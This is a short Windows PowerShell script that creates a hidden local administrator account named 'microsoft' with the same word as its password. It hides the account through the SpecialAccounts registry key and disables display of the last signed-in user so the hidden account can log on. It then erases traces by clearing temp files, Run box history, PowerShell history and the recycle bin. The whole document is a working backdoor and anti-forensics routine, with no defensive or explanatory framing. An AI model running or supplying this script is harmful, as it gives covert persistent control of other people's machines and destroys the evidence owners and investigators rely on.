# Create a new user
net user microsoft microsoft /add

#Get local admin group name 
$LocalAdminGroupName = gwmi win32_group -filter "LocalAccount = $TRUE And SID = 'S-1-5-32-544'" | select -expand name

# Add this user to the localgroup "Administrators"
net localgroup $LocalAdminGroupName microsoft /add

# Make this user invisible
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v microsoft /t REG_DWORD /d 0 /f

# Set interactive logon on: Don't display last signed-in to allow you to connect to invisible account
New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name dontdisplaylastusername -PropertyType DWORD -Value 1 -Force

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
